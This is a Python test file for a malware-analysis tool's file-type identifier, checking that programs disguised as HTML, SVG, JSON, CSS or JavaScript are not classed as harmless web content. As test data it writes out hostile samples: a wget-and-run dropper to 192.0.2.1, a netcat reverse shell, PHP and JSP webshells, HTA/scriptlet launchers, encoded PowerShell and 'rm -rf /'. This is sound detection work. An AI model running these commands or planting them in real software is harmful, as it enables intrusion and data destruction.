"""Probes: a program dressed as a web file must never get a web kind.

A web kind means "ordinary web content": no hash indicator, no lookup, no links followed. So every
case here tries to look like a page, an image, JSON, a style sheet or the JavaScript of a page while
carrying a command, a downloader or active content, and must keep a non-web kind (`script` or
`text`) whose links are followed. The positive controls keep the guard honest in the other
direction.
"""

from __future__ import annotations

import pytest

from suckerpot_analysis import WEB_KINDS, CompiledRules, Limits, analyze, identify

DROPPER = b"cd /tmp; wget http://192.0.2.1/a; chmod +x a; ./a"

# The cases a reviewer found, verbatim in spirit: each one used to get a web kind.
REVIEWED = {
    "brace group read as json": b"{ true; cd /tmp; wget http://192.0.2.1/a; chmod +x a; ./a; }",
    "test and brace group read as json": (
        b"[ 1 ] && { cd /tmp; wget http://192.0.2.1/a; chmod +x a; ./a; }"
    ),
    "charset line then a dropper": b'@charset "utf-8";\n' + DROPPER,
    "redirect first and an html tag in a comment": (
        b"</dev/null cd /tmp\n# <p>\nwget http://192.0.2.1/a; chmod +x a; ./a\n"
    ),
    "hta": (
        b'<html><head><HTA:APPLICATION ID="x" APPLICATIONNAME="x"/><script language="VBScript">'
        b'Set o = CreateObject("WScript.Shell"): o.Run "mshta http://192.0.2.1/a"</script>'
        b"</head></html>"
    ),
    "jsp webshell": (
        b'<html><body><% Runtime.getRuntime().exec(request.getParameter("c")); %></body></html>'
    ),
    "php short tag": b"<html><body><? system($_GET['c']) ?></body></html>",
    "sct scriptlet": (
        b'<?XML version="1.0"?><scriptlet><registration progid="x" classid="{0}">'
        b'<script language="JScript"><![CDATA[ new ActiveXObject("WScript.Shell").Run("calc"); '
        b"]]></script></registration></scriptlet>"
    ),
    "node with a split module name": (
        b'"use strict";var cp=require("child"+"_process");var f=function(){cp.execSync("id")};f();'
    ),
    "node chmod": (
        b'"use strict";var fs=require("fs");var f=function(){fs.chmodSync("/tmp/a",493)};f();'
    ),
    "wsh active x": (
        b'var sh=new ActiveXObject("WScript.Shell");var f=function(){sh.Run("calc")};f();'
    ),
}

# Payloads that need no particular word in common, wrapped in each disguise below.
PAYLOADS = {
    "shell dropper": DROPPER,
    "pipe to a shell": b"echo aGk= | base64 -d | sh",
    "powershell": b"powershell -enc AAAA",
    "asp tag": b'<% Runtime.getRuntime().exec("id") %>',
    "php": b'<?php system("id"); ?>',
    "python": b'import os\nos.system("id")',
    "node spawn": b'require("child"+"_process").spawn("sh")',
    "node chmod": b'fs.chmodSync("/tmp/a", 0o755)',
    "wsh": b'new ActiveXObject("WScript.Shell").Run("calc")',
    "perl": b'my $x = "id"; system($x);',
}
DISGUISES = {
    "html": b"<!doctype html><html><head><title>t</title></head><body>hi</body></html>\n",
    "svg": b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"></svg>\n',
    "xml": b'<?xml version="1.0"?><rss version="2.0"><channel/></rss>\n',
    "css": b"/* a */\nbody{margin:0}a{color:red}p{padding:0}\n",
    "css at rule": b'@charset "utf-8";\n',
    "json": b'{"a": 1}\n',
    "js": b'"use strict";var a=function(){return 1};var b=2;\n',
}


@pytest.mark.parametrize("name", sorted(REVIEWED))
def test_reviewed_cases_keep_a_non_web_kind(name: str) -> None:
    assert identify(REVIEWED[name]).kind not in WEB_KINDS


@pytest.mark.parametrize("payload", sorted(PAYLOADS))
@pytest.mark.parametrize("disguise", sorted(DISGUISES))
def test_a_disguise_does_not_hide_a_payload(disguise: str, payload: str) -> None:
    for data in (
        DISGUISES[disguise] + PAYLOADS[payload],
        PAYLOADS[payload] + b"\n" + DISGUISES[disguise],
    ):
        assert identify(data).kind not in WEB_KINDS, (disguise, payload)


@pytest.mark.parametrize("payload", sorted(PAYLOADS))
@pytest.mark.parametrize("disguise", sorted(DISGUISES))
def test_a_payload_far_past_the_header_is_still_found(disguise: str, payload: str) -> None:
    # Past the 4 KiB header read and past the 1 MiB deobfuscation limit: the scan covers it all.
    padding = b" " * (1_200_000)
    data = DISGUISES[disguise] + padding + PAYLOADS[payload]
    assert identify(data).kind not in WEB_KINDS, (disguise, payload)


def test_large_web_files_with_a_payload_at_the_very_end() -> None:
    for disguise in ("html", "js", "css"):
        body = DISGUISES[disguise] + b"/* x */ " * 500_000
        assert identify(body).kind in WEB_KINDS  # control: without the payload it is web
        assert identify(body + b"\n" + DROPPER).kind not in WEB_KINDS


def test_a_dropper_dressed_as_web_content_is_still_followed(rules: CompiledRules) -> None:
    for name, data in REVIEWED.items():
        result = analyze(data, rules=rules, limits=Limits())
        assert result.file.kind not in WEB_KINDS, name
    result = analyze(REVIEWED["brace group read as json"], rules=rules)
    assert [i.value for i in result.iocs] == ["http://192.0.2.1/a"]
    assert result.severity != "info"


# -- structure checks ----------------------------------------------------------------------------


def test_json_must_parse() -> None:
    assert identify(b'{"a": [1, 2, {"b": null}], "c": "x"}').kind == "json"
    assert identify(b'{"a": 1}\nrun_this_now').kind not in WEB_KINDS
    assert identify(b'{"a": 1,}').kind not in WEB_KINDS
    assert identify(b'{"a": ' + b"[" * 100_000 + b"]" * 100_000 + b"}").kind not in WEB_KINDS
    big = b'{"a": "' + b"x" * 3_000_000 + b'"}'  # above the parse limit: no web kind
    assert identify(big).kind not in WEB_KINDS


def test_css_must_be_made_of_rules() -> None:
    sheet = b"a{color:red}b{margin:0}@media (min-width:1px){c{padding:0;margin:0}}"
    assert identify(sheet).kind == "css"
    data_uri = b"a{background:url(data:image/png;base64,iVBORw0KGgo=)}b{margin:0}c{color:#fff}"
    assert identify(data_uri).kind == "css"
    for bad in (
        sheet + b"\nimport os\nos.getcwd()",  # code after the last rule
        sheet + b"\nfoo bar baz;",  # a statement outside a block that is not an at-rule
        b"a{color:red}b{margin:0}c{padding:0} d{ run this }",  # a block without a declaration
        b"a{color:red}b{margin:0}c{padding:0}}",  # an extra closing brace
        b"a{color:red}b{margin:0}c{padding:0 ",  # an unterminated block
    ):
        assert identify(bad).kind not in WEB_KINDS, bad


def test_markup_must_open_like_a_document() -> None:
    assert identify(b"<!-- c --><!doctype html><html><body>x</body></html>").kind == "html"
    assert identify(b'<?xml version="1.0"?><!DOCTYPE svg><svg></svg>').kind == "svg"
    for bad in (
        b"</p>\nwget http://192.0.2.1/a",  # a closing tag cannot open a page
        b"<unknown><p>x</p></unknown>",  # an unknown root
        b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "b">]><svg>&a;</svg>',  # entities
        b'<?xml version="1.0"?><x:stylesheet xmlns:x="urn:x"></x:stylesheet>',
        b"<!-- never closed <html><body>",
    ):
        assert identify(bad).kind not in WEB_KINDS, bad


def test_other_languages_that_share_a_few_words_with_javascript() -> None:
    python = b"import os\nimport sys\nwindow.a = 1\ndocument.b = 2\ndef f(a):\n    return a\n"
    assert identify(python).kind not in WEB_KINDS
    perl = b"use strict;\nmy $x = 1;\nwindow.a = 1\ndocument.b = 2\n"
    assert identify(perl).kind not in WEB_KINDS


# -- positive controls ---------------------------------------------------------------------------


@pytest.mark.parametrize("disguise", sorted(DISGUISES))
def test_the_disguises_alone_are_web_content(disguise: str) -> None:
    kind = identify(DISGUISES[disguise]).kind
    assert kind in WEB_KINDS, (disguise, kind)


# Words a shell script uses, in files that are not shell scripts: single words are not enough.
INNOCENT_WORDS = {
    "es module with export default and export const": (
        b'import{a as b}from"./x.js";const c=function(){return b};export const d=2;'
        b"export default c;export function e(){return d}\n"
    ),
    "minified js with echo and bash in strings and names": (
        b'var echo=function(e){return e},bash="bash -x echo",sh=1;window.q=function(e){return '
        b"e|sh};window.x=echo(bash);var o={export:1,exports:2,echo:3};\n"
    ),
    "html text that mentions bash and export": (
        b"<!doctype html><html><body><p>Open bash, then export the data and echo it.</p>"
        b"<button>Export</button></body></html>"
    ),
    "css with a charset and a comment about the shell": (
        b'@charset "utf-8";\n/* styles for the shell, the bash prompt and the export button */\n'
        b"body{margin:0}.shell{color:#fff}\n"
    ),
    "json that names a shell": b'{"command": "echo", "shell": "bash", "export": true}\n',
    "xml that mentions echo and export": (
        b'<?xml version="1.0"?><rss version="2.0"><channel><title>echo and export in bash'
        b"</title></channel></rss>"
    ),
}


@pytest.mark.parametrize("name", sorted(INNOCENT_WORDS))
def test_single_shell_words_do_not_make_a_file_a_program(name: str) -> None:
    kind = identify(INNOCENT_WORDS[name]).kind
    assert kind in WEB_KINDS, (name, kind)


def test_the_same_words_as_statements_are_a_program() -> None:
    for statement in (
        b"export PATH=/usr/bin",
        b"bash -c 'id'",
        b"x | sh",
        b"cd /tmp",
        b"cd /dev/shm",
        b"nohup ./a &",
        b"echo a >> /var/tmp/x",
        b"nc -e /bin/sh 192.0.2.1 4444",
        b"true; ./a",
        b"true && ./a",
        b"rm -rf /",
    ):
        for disguise in ("html", "js", "json", "css"):
            data = DISGUISES[disguise] + b"\n" + statement + b"\n"
            assert identify(data).kind not in WEB_KINDS, (disguise, statement)
